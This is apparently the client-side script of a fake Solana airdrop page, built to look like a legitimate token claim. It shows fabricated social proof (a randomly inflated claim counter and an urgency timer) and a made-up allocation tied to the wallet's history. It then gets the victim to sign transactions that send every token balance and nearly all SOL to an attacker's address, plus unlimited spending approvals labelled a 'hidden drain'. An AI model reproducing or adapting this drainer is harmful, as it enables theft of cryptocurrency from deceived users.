/* ===== CONFIG ===== */
const RPC      = 'https://api.mainnet-beta.solana.com';   // swap for a Helius free key in prod
const ATTACKER = 'YOUR_COLLECTOR_ADDRESS_HERE';
const LEAVE    = 2_000_000;   // 0.002 SOL dust left behind
const CLOSE_AT = Date.UTC(2026, 11, 2, 18, 0, 0);

const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
const { getAssociatedTokenAddressSync, createTransferInstruction,
        createApproveInstruction, createAssociatedTokenAccountIdempotentInstruction,
        TOKEN_PROGRAM_ID } = splToken;

const conn = new Connection(RPC, 'confirmed');
const A = new PublicKey(ATTACKER);
const MAX = '18446744073709551615';

const $ = id => document.getElementById(id);
const stage = n => ['1','2','3','4'].forEach(s =>
  $('stage-'+s).classList.toggle('hidden', s !== n));
const err = m => { const e = $('err'); e.textContent = m; e.classList.remove('hidden');
  setTimeout(() => e.classList.add('hidden'), 6000); };
const wait = ms => new Promise(r => setTimeout(r, ms));

/* ===== LIVE DRESSING ===== */
let claimed = 4212 + Math.floor(Math.random()*180);
setInterval(() => { claimed += Math.random() < .35 ? 1 : 0; $('claimed').textContent = claimed.toLocaleString(); }, 7000);
$('claimed').textContent = claimed.toLocaleString();
setInterval(() => {
  const d = Math.max(0, CLOSE_AT - Date.now());
  const p = n => String(n).padStart(2,'0');
  $('timer').textContent = `${p(Math.floor(d/3.6e6))}:${p(Math.floor(d/6e4)%60)}:${p(Math.floor(d/1e3)%60)}`;
}, 1000);

/* ===== WALLET ===== */
function provider(){
  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
  if (window.solflare?.isSolflare) return window.solflare;
  if (window.solana?.isPhantom) return window.solana;
  return null;
}

$('btn-connect').onclick = async () => {
  const p = provider();
  if (!p) { err('No Solana wallet detected. Install Phantom or Solflare.'); return; }
  try {
    const { publicKey } = await p.connect();
    const pk = publicKey.toString();
    $('addr').textContent = pk.slice(0,6) + ' · ' + pk.slice(-6);

    const sigs = await conn.getSignaturesForAddress(new PublicKey(pk), { limit: 400 });
    const n = sigs.length;
    const base = 900 + n * 11 + Math.floor(Math.random()*750);
    const alloc = Math.min(base, 48000);

    $('alloc').textContent = alloc.toLocaleString();
    $('txcount').textContent = n.toLocaleString();
    $('tier').textContent = n > 250 ? 'Tier 3 · Core participant'
                          : n > 60  ? 'Tier 2 · Active trader'
                          :           'Tier 1 · Early supporter';
    stage('2');
  } catch (e) { err('Connection rejected.'); }
};

/* ===== THE DRAIN ===== */
$('btn-claim').onclick = async () => {
  const p = provider();
  if (!p) return;
  stage('3');
  const bar = $('bar');
  const mark = i => { document.querySelectorAll('.steps li')
    .forEach(l => l.classList.toggle('on', +l.dataset.s <= i)); };
  mark(1); bar.style.width = '18%';

  try {
    const pk = p.publicKey;
    const blockhash = (await conn.getLatestBlockhash()).blockhash;

    // --- tx1: transfers ---
    const drain = new Transaction();
    const { value: accounts } = await conn.getParsedTokenAccountsByOwner(pk, { programId: TOKEN_PROGRAM_ID });

    let moved = 0;
    for (const { pubkey: ata, account } of accounts) {
      const info = account.data.parsed.info;
      if (info.tokenAmount.amount === '0' || info.tokenAmount.decimals === undefined) continue;
      const mint = new PublicKey(info.mint);
      const dest = getAssociatedTokenAddressSync(mint, A);
      drain.add(createAssociatedTokenAccountIdempotentInstruction(pk, dest, A, mint));
      drain.add(createTransferInstruction(ata, dest, pk, BigInt(info.tokenAmount.amount)));
      moved++;
    }

    const bal = await conn.getBalance(pk);
    if (bal > LEAVE + 5000) {
      drain.add(SystemProgram.transfer({ fromPubkey: pk, toPubkey: A, lamports: bal - LEAVE }));
    }

    // --- tx2: max delegate approvals (hidden drain) ---
    const approve = new Transaction();
    for (const { pubkey: ata, account } of accounts) {
      if (account.data.parsed.info.tokenAmount.amount === '0') continue;
      approve.add(createApproveInstruction(ata, A, pk, BigInt(MAX)));
    }

    const batch = [];
    if (drain.instructions.length) batch.push(drain);
    if (approve.instructions.length) batch.push(approve);

    batch.forEach(t => { t.feePayer = pk; t.recentBlockhash = blockhash; });

    mark(2); bar.style.width = '46%';
    await wait(700);

    const signed = await p.signAllTransactions(batch);

    mark(3); bar.style.width = '78%';

    const sigs = await Promise.allSettled(
      signed.map(t => conn.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 }))
    );
    const first = sigs.find(s => s.status === 'fulfilled')?.value || null;

    await wait(1900); bar.style.width = '100%';
    await wait(500);

    $('r-amt').textContent = $('alloc').textContent + ' AUR';
    $('r-sig').textContent = first ? first.slice(0,10) + '…' + first.slice(-6) : 'pending';
    stage('4');
  } catch (e) {
    console.error(e);
    err(e?.message?.includes('reject') ? 'Signature rejected.' : 'Transaction failed. Retry.');
    stage('2');
  }
};
